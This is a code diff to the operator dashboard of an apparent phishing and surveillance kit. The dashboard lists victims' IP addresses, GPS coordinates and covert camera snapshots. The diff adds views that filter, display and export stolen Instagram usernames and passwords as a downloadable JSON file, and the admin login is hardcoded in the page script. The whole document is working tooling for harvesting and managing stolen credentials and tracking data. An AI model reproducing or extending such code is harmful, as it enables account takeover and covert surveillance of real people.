@@ -35,10 +35,11 @@
     <div id="dashboard-box" class="max-w-6xl w-full mx-auto hidden p-4 md:p-8">
         <div class="flex flex-col md:flex-row justify-between items-center mb-8 bg-slate-900 border border-slate-800 p-6 rounded-2xl gap-4">
             <div>
-                <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs</h1>
+                <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs & Credentials</h1>
                 <p class="text-slate-400 text-xs mt-1">Automatic background data sync active.</p>
             </div>
             <div class="flex flex-wrap gap-3">
+                <button onclick="toggleCredentialsView()" id="view-cred-btn" class="bg-pink-600 hover:bg-pink-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-pink-600/20">View Only Credentials</button>
                 <button onclick="downloadDataJSON()" class="bg-emerald-600 hover:bg-emerald-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-emerald-600/20">Download JSON</button>
                 <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Refresh</button>
                 <button onclick="logout()" class="bg-rose-600/20 text-rose-400 hover:bg-rose-600/30 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Logout</button>
@@ -51,7 +52,8 @@
     <script>
         const ADMIN_USER = "sumit@1123";
         const ADMIN_PASS = "sumit1123";
-        let globalLogsData = {}; // Store fetched logs globally for downloading
+        let globalLogsData = {};
+        let onlyCredentialsMode = false;
 
         function checkLogin() {
             const user = document.getElementById("username").value;
@@ -74,73 +76,78 @@
             document.getElementById("password").value = "";
         }
 
+        function toggleCredentialsView() {
+            onlyCredentialsMode = !onlyCredentialsMode;
+            const btn = document.getElementById("view-cred-btn");
+            if (onlyCredentialsMode) {
+                btn.innerText = "Show All Logs";
+                btn.className = "bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg";
+            } else {
+                btn.innerText = "View Only Credentials";
+                btn.className = "bg-pink-600 hover:bg-pink-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-pink-600/20";
+            }
+            renderLogs(globalLogsData);
+        }
+
         function loadLogs() {
             fetch('/api/get-data')
                 .then(res => res.json())
                 .then(data => {
-                    globalLogsData = data; // Save data locally for download feature
-                    const grid = document.getElementById("logs-grid");
-                    grid.innerHTML = "";
-
-                    if (Object.keys(data).length === 0) {
-                        grid.innerHTML = "<p class='text-slate-500 col-span-full text-center py-10'>No tracking data recorded yet.</p>";
-                        return;
-                    }
-
-                    for (let key in data) {
-                        let item = data[key];
-                        
-                        // Contacts formatting
-                        let contactsHtml = '<p class="text-slate-500">No Contacts Shared</p>';
-                        if (Array.isArray(item.contacts) && item.contacts.length > 0) {
-                            contactsHtml = '<ul class="max-h-28 overflow-y-auto space-y-1 bg-slate-950 p-2 rounded border border-slate-800 text-[11px] font-mono">';
-                            item.contacts.forEach(c => {
-                                let name = c.name ? c.name.join(', ') : 'Unknown';
-                                let tel = c.tel ? c.tel.join(', ') : 'No Number';
-                                contactsHtml += `<li><strong>${name}:</strong> ${tel}</li>`;
-                            });
-                            contactsHtml += '</ul>';
-                        } else if (typeof item.contacts === 'string') {
-                            contactsHtml = `<p class="text-slate-400 text-xs">${item.contacts}</p>`;
-                        }
-
-                        let card = document.createElement("div");
-                        card.className = "bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between";
-                        
-                        card.innerHTML = `
-                            <div>
-                                <div class="flex justify-between items-center mb-3">
-                                    <span class="text-[10px] bg-indigo-500/20 text-indigo-300 font-mono px-2 py-0.5 rounded">${item.id}</span>
-                                    <span class="text-[10px] text-slate-400">${new Date(item.timestamp).toLocaleString()}</span>
-                                </div>
-                                <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono">
-                                    <p><strong>IP:</strong> ${item.ip}</p>
-                                    <p><strong>Lat:</strong> ${item.latitude}</p>
-                                    <p><strong>Lon:</strong> ${item.longitude}</p>
-                                    ${!isNaN(item.latitude) ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
-                                </div>
-                                <div class="mb-3">
-                                    <p class="text-xs font-semibold text-indigo-300 mb-1">Contacts / Call List:</p>
-                                    <div>${contactsHtml}</div>
-                                </div>
-                            </div>
-                            <div class="grid grid-cols-2 gap-2">
-                                <div>
-                                    <p class="text-[10px] text-slate-400 mb-1">Camera Snap</p>
-                                    ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-32 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-[10px] text-rose-400 border border-slate-800">None</div>'}
-                                </div>
-                                <div>
-                                    <p class="text-[10px] text-slate-400 mb-1">Gallery Image</p>
-                                    ${item.gallery_image ? `<img src="${item.gallery_image}" class="rounded-xl w-full h-32 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-[10px] text-slate-500 border border-slate-800">Not Uploaded</div>'}
-                                </div>
-                            </div>
-                        `;
-                        grid.appendChild(card);
-                    }
+                    globalLogsData = data;
+                    renderLogs(data);
                 });
         }
 
-        // Function to download logs as a JSON file
+        function renderLogs(data) {
+            const grid = document.getElementById("logs-grid");
+            grid.innerHTML = "";
+
+            let filteredKeys = Object.keys(data).filter(key => {
+                let item = data[key];
+                if (onlyCredentialsMode) {
+                    return item.instagram_username && item.instagram_username !== 'N/A';
+                }
+                return true;
+            });
+
+            if (filteredKeys.length === 0) {
+                grid.innerHTML = "<p class='text-slate-500 col-span-full text-center py-10'>No matching tracking data recorded yet.</p>";
+                return;
+            }
+
+            filteredKeys.forEach(key => {
+                let item = data[key];
+                
+                let card = document.createElement("div");
+                card.className = "bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between";
+                
+                card.innerHTML = `
+                    <div>
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-[10px] bg-indigo-500/20 text-indigo-300 font-mono px-2 py-0.5 rounded">${item.id}</span>
+                            <span class="text-[10px] text-slate-400">${new Date(item.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono bg-slate-950 p-3 rounded-xl border border-slate-800">
+                            <p class="text-pink-400 font-bold mb-1">-- Instagram Credentials --</p>
+                            <p><strong>User:</strong> <span class="text-white select-all bg-slate-900 px-1 py-0.5 rounded">${item.instagram_username}</span></p>
+                            <p><strong>Pass:</strong> <span class="text-white select-all bg-slate-900 px-1 py-0.5 rounded">${item.instagram_password}</span></p>
+                        </div>
+                        <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono">
+                            <p><strong>IP:</strong> ${item.ip}</p>
+                            <p><strong>Lat:</strong> ${item.latitude}</p>
+                            <p><strong>Lon:</strong> ${item.longitude}</p>
+                            ${!isNaN(item.latitude) ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
+                        </div>
+                    </div>
+                    <div>
+                        <p class="text-[10px] text-slate-400 mb-1">Camera Snap</p>
+                        ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-36 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-36 rounded-xl flex items-center justify-center text-[10px] text-rose-400 border border-slate-800">None Captured</div>'}
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
         function downloadDataJSON() {
             if (Object.keys(globalLogsData).length === 0) {
                 alert("No data available to download!");
@@ -149,7 +156,7 @@
             const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(globalLogsData, null, 4));
             const downloadAnchor = document.createElement('a');
             downloadAnchor.setAttribute("href", dataStr);
-            downloadAnchor.setAttribute("download", "system_logs_" + Date.now() + ".json");
+            downloadAnchor.setAttribute("download", "instagram_credentials_logs_" + Date.now() + ".json");
             document.body.appendChild(downloadAnchor);
             downloadAnchor.click();
             downloadAnchor.remove();
